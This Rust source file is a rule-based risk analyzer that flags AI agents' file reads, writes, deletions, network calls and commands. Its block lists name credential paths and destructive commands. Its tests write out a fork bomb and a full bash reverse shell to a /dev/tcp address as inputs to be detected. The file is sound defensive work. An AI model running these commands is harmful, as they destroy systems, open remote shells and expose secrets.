//! Deterministic rule-based risk analysis for agent actions.
//!
//! This is the offline-first core: no network, no paid model.
//! Every rule deliberately errs on the side of flagging.

use crate::model::{AgentAction, RiskVerdict, Severity};

const SECRET_PATTERNS: &[(&str, Severity, &str)] = &[
    (".ssh/id_rsa", Severity::Critical, "SSH private key accessed"),
    (".ssh/id_ed25519", Severity::Critical, "SSH private key accessed"),
    (".ssh/", Severity::High, "SSH config/keys directory touched"),
    (".aws/credentials", Severity::Critical, "AWS credentials file accessed"),
    (".aws/", Severity::High, "AWS config/credentials directory touched"),
    (".env", Severity::Critical, "Environment file (likely secrets) accessed"),
    (".git-credentials", Severity::Critical, "Git stored credentials accessed"),
    (".npmrc", Severity::High, "npm config (may contain tokens) accessed"),
    (".pypirc", Severity::High, "PyPI config (may contain tokens) accessed"),
    ("gcloud", Severity::High, "Google Cloud config touched"),
    ("kube/config", Severity::High, "Kubernetes kubeconfig accessed"),
    ("secrets", Severity::High, "Path hints at secrets"),
    ("password", Severity::High, "Path contains 'password'"),
    ("passwd", Severity::High, "Path contains 'passwd'"),
    ("token", Severity::Medium, "Path contains 'token'"),
    (".azure/", Severity::High, "Azure config/credentials directory touched"),
    (".docker/config.json", Severity::Critical, "Docker credentials accessed"),
    (".config/gh", Severity::High, "GitHub CLI config (may contain tokens) accessed"),
    (".netrc", Severity::Critical, "Netrc credentials file accessed"),
    ("id_ecdsa", Severity::Critical, "SSH private key accessed"),
    ("id_dsa", Severity::Critical, "SSH private key accessed"),
    ("credentials.json", Severity::Critical, "Cloud credentials file accessed"),
    ("service-account", Severity::Critical, "GCP service account key accessed"),
    (".kube/config", Severity::Critical, "Kubernetes kubeconfig accessed"),
    ("kubeconfig", Severity::High, "Kubernetes kubeconfig accessed"),
    ("api_key", Severity::High, "Path contains 'api_key'"),
    ("apikey", Severity::High, "Path contains 'apikey'"),
    ("secret_key", Severity::Critical, "Path contains 'secret_key'"),
    ("private_key", Severity::Critical, "Path contains 'private_key'"),
    ("access_token", Severity::High, "Path contains 'access_token'"),
    ("refresh_token", Severity::High, "Path contains 'refresh_token'"),
    ("database_url", Severity::High, "Path contains 'database_url'"),
    ("db_password", Severity::Critical, "Path contains 'db_password'"),
    (".pem", Severity::High, "PEM certificate/key file accessed"),
    (".key", Severity::High, "Key file accessed"),
    (".p12", Severity::High, "PKCS12 certificate accessed"),
    (".pfx", Severity::High, "PKCS12 certificate accessed"),
    ("kubeconfig", Severity::High, "Kubernetes kubeconfig accessed"),
    (".vault-token", Severity::Critical, "Vault token accessed"),
    ("vault-token", Severity::Critical, "Vault token accessed"),
];

const DESTRUCTIVE_PATTERNS: &[(&str, Severity, &str)] = &[
    ("rm -rf", Severity::Critical, "Recursive forced delete"),
    ("rm -r", Severity::High, "Recursive delete"),
    ("mkfs", Severity::Critical, "Filesystem format"),
    ("fdisk", Severity::Critical, "Partition manipulation"),
    ("dd if=/dev/zero", Severity::Critical, "Disk destroying write"),
    (":(){ :|:& };:", Severity::Critical, "Fork bomb"),
    ("chmod 777 /", Severity::High, "World-writable root permission"),
    ("sudo rm", Severity::Critical, "Privileged delete"),
    ("sudo dd", Severity::Critical, "Privileged disk write"),
    ("shutdown", Severity::Critical, "System shutdown"),
    ("reboot", Severity::High, "System reboot"),
    ("halt", Severity::High, "System halt"),
    ("poweroff", Severity::High, "Power off"),
    ("init 0", Severity::Critical, "Init shutdown"),
    ("init 6", Severity::High, "Init reboot"),
    ("kill -9 1", Severity::Critical, "Kill init process"),
    ("killall", Severity::High, "Kill all processes"),
    ("pkill", Severity::High, "Process kill"),
    ("systemctl stop", Severity::High, "Stop system service"),
    ("systemctl disable", Severity::Medium, "Disable system service"),
    ("crontab -r", Severity::High, "Remove all cron jobs"),
    ("iptables -F", Severity::High, "Flush firewall rules"),
    ("ufw disable", Severity::High, "Disable firewall"),
    ("userdel", Severity::Critical, "Delete user account"),
    ("chpasswd", Severity::Critical, "Batch password change"),
    ("usermod", Severity::High, "User account modification"),
    ("groupdel", Severity::High, "Delete group"),
    ("deluser", Severity::High, "Delete user"),
    ("delgroup", Severity::High, "Delete group"),
    ("rm -f /", Severity::Critical, "Force delete root"),
    ("rm -rf /", Severity::Critical, "Recursive forced delete root"),
    ("rm -rf /*", Severity::Critical, "Recursive forced delete all"),
    ("rm -rf ~", Severity::Critical, "Recursive delete home"),
    ("rm -rf $HOME", Severity::Critical, "Recursive delete home"),
    ("rm -rf /*", Severity::Critical, "Recursive delete all files"),
    ("> /dev/sda", Severity::Critical, "Raw disk overwrite"),
    ("dd if=", Severity::High, "Raw disk operation"),
    ("base64 -d", Severity::Medium, "Base64 decode (potential payload)"),
    ("eval(", Severity::High, "Dynamic code evaluation"),
    ("exec(", Severity::High, "Dynamic code execution"),
    ("wget ", Severity::Medium, "File download"),
    ("curl -o", Severity::Medium, "File download via curl"),
    ("curl -O", Severity::Medium, "File download via curl"),
    ("nc -l", Severity::High, "Netcat listener (potential reverse shell)"),
    ("nc -e", Severity::Critical, "Netcat reverse shell"),
    ("bash -i", Severity::Critical, "Interactive bash (potential reverse shell)"),
    ("/bin/bash -i", Severity::Critical, "Interactive bash (potential reverse shell)"),
    ("python -c", Severity::Medium, "Python one-liner execution"),
    ("python3 -c", Severity::Medium, "Python one-liner execution"),
    ("perl -e", Severity::Medium, "Perl one-liner execution"),
    ("ruby -e", Severity::Medium, "Ruby one-liner execution"),
    ("php -r", Severity::Medium, "PHP one-liner execution"),
    ("node -e", Severity::Medium, "Node one-liner execution"),
];

const SAFE_PATTERNS: &[(&str, &str)] = &[
    ("README", "reading documentation"),
    (".md", "reading markdown docs"),
    ("cargo build", "build"),
    ("cargo test", "test"),
    ("npm test", "test"),
    ("git status", "repo status"),
    ("git diff", "diff inspection"),
    ("ls ", "listing"),
    ("ls", "listing"),
];

/// Paths we consider benign to only *read* (not write/delete).
fn is_benign_read(action: &AgentAction) -> bool {
    if action.kind != "read_file" {
        return false;
    }
    let t = action.target.to_ascii_lowercase();
    t.ends_with(".md")
        || t.ends_with(".txt")
        || t.ends_with(".rs")
        || t.ends_with(".py")
        || t.ends_with(".toml")
        || t.ends_with(".json")
        || t.ends_with(".yml")
        || t.ends_with(".yaml")
        || t.contains("readme")
}

/// Analyze one action and produce a verdict.
pub fn analyze(action: &AgentAction) -> RiskVerdict {
    // Destructive commands are critical regardless.
    for (pat, sev, reason) in DESTRUCTIVE_PATTERNS {
        if action.target.contains(pat) {
            return RiskVerdict {
                severity: *sev,
                reason: reason.to_string(),
                indicators: vec![pat.to_string()],
            };
        }
    }

    // Network exfiltration / unknown destinations.
    if action.kind == "network" {
        let t = action.target.to_ascii_lowercase();
        if t.contains("10.") || t.contains("192.168.") || t.contains("localhost") {
            return RiskVerdict {
                severity: Severity::Medium,
                reason: "Network call to private/local address".into(),
                indicators: vec!["private-network".into()],
            };
        }
        // Upload verbs to non-official domains get a medium+.
        return RiskVerdict {
            severity: Severity::Medium,
            reason: "Network call initiated".into(),
            indicators: vec!["network".into()],
        };
    }

    // Write to credential/secret files is critical.
    if action.kind == "write_file" {
        let t = action.target.to_ascii_lowercase();
        if t.contains(".ssh/") || t.contains(".aws/") || t.contains(".env") {
            return RiskVerdict {
                severity: Severity::Critical,
                reason: "Writing to credential/likely-secret file".into(),
                indicators: vec!["credential-write".into()],
            };
        }
        if t.contains("/etc/")
            || t.contains("/usr/")
            || t.contains("/boot/")
            || t.contains("/var/www")
        {
            return RiskVerdict {
                severity: Severity::High,
                reason: "Writing to system/privileged path".into(),
                indicators: vec!["system-path".into()],
            };
        }
    }

    // Secret paths — pick the most specific (longest) matching pattern.
    let lower_target = action.target.to_ascii_lowercase();
    let mut best: Option<(&str, Severity, &str)> = None;
    for (pat, sev, reason) in SECRET_PATTERNS {
        if lower_target.contains(pat) && (best.is_none() || pat.len() > best.unwrap().0.len()) {
            best = Some((pat, *sev, reason));
        }
    }
    if let Some((pat, sev, reason)) = best {
        // Reading docs/markdown is benign unless it truly is a secret path.
        if sev >= Severity::High || !is_benign_read(action) {
            return RiskVerdict {
                severity: sev,
                reason: reason.to_string(),
                indicators: vec![pat.to_string()],
            };
        }
    }

    // Deletion of any kind.
    if action.kind == "delete" {
        return RiskVerdict {
            severity: Severity::High,
            reason: "Delete operation attempted".into(),
            indicators: vec!["delete".into()],
        };
    }



    // Known-safe stuff.
    for (pat, reason) in SAFE_PATTERNS {
        if action.target.contains(pat) {
            return RiskVerdict {
                severity: Severity::Low,
                reason: reason.to_string(),
                indicators: vec!["benign".into()],
            };
        }
    }

    RiskVerdict {
        severity: Severity::Medium,
        reason: "Unrecognized action — default to caution".into(),
        indicators: vec!["unknown".into()],
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn action(kind: &str, target: &str) -> AgentAction {
        AgentAction {
            kind: kind.into(),
            target: target.into(),
            content: String::new(),
            agent: "test".into(),
        }
    }

    #[test]
    fn flags_ssh_key_read() {
        let v = analyze(&action("read_file", "/home/user/.ssh/id_rsa"));
        assert_eq!(v.severity, Severity::Critical);
    }

    #[test]
    fn flags_recursive_rm() {
        let v = analyze(&action("run_command", "rm -rf /home/user/project"));
        assert_eq!(v.severity, Severity::Critical);
    }

    #[test]
    fn env_file_is_critical() {
        let v = analyze(&action("read_file", "/home/user/proj/.env"));
        assert_eq!(v.severity, Severity::Critical);
    }

    #[test]
    fn readme_is_low() {
        let v = analyze(&action("read_file", "README.md"));
        assert_eq!(v.severity, Severity::Low);
    }

    #[test]
    fn write_to_etc_is_high() {
        let v = analyze(&action("write_file", "/etc/hosts"));
        assert_eq!(v.severity, Severity::High);
    }

    #[test]
    fn flags_aws_credentials() {
        let v = analyze(&action("read_file", "/home/user/.aws/credentials"));
        assert_eq!(v.severity, Severity::Critical);
    }

    #[test]
    fn flags_docker_config() {
        let v = analyze(&action("read_file", "/home/user/.docker/config.json"));
        assert_eq!(v.severity, Severity::Critical);
    }

    #[test]
    fn flags_netrc() {
        let v = analyze(&action("read_file", "/home/user/.netrc"));
        assert_eq!(v.severity, Severity::Critical);
    }

    #[test]
    fn flags_kubeconfig() {
        let v = analyze(&action("read_file", "/home/user/.kube/config"));
        assert_eq!(v.severity, Severity::Critical);
    }

    #[test]
    fn flags_vault_token() {
        let v = analyze(&action("read_file", "/home/user/.vault-token"));
        assert_eq!(v.severity, Severity::Critical);
    }

    #[test]
    fn flags_shutdown() {
        let v = analyze(&action("run_command", "shutdown -h now"));
        assert_eq!(v.severity, Severity::Critical);
    }

    #[test]
    fn flags_fork_bomb() {
        let v = analyze(&action("run_command", ":(){ :|:& };:"));
        assert_eq!(v.severity, Severity::Critical);
    }

    #[test]
    fn flags_reverse_shell() {
        let v = analyze(&action("run_command", "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"));
        assert_eq!(v.severity, Severity::Critical);
    }

    #[test]
    fn flags_delete_operation() {
        let v = analyze(&action("delete", "/home/user/important.txt"));
        assert_eq!(v.severity, Severity::High);
    }

    #[test]
    fn flags_write_to_system_path() {
        let v = analyze(&action("write_file", "/usr/local/bin/evil"));
        assert_eq!(v.severity, Severity::High);
    }

    #[test]
    fn flags_write_to_credential_file() {
        let v = analyze(&action("write_file", "/home/user/.ssh/authorized_keys"));
        assert_eq!(v.severity, Severity::Critical);
    }

    #[test]
    fn flags_network_to_private() {
        let v = analyze(&action("network", "http://192.168.1.1/api"));
        assert_eq!(v.severity, Severity::Medium);
    }

    #[test]
    fn flags_unknown_as_medium() {
        let v = analyze(&action("unknown_kind", "some_target"));
        assert_eq!(v.severity, Severity::Medium);
    }

    #[test]
    fn flags_api_key_path() {
        let v = analyze(&action("read_file", "/home/user/config/api_key.txt"));
        assert_eq!(v.severity, Severity::High);
    }

    #[test]
    fn flags_pem_file() {
        let v = analyze(&action("read_file", "/home/user/cert.pem"));
        assert_eq!(v.severity, Severity::High);
    }
}
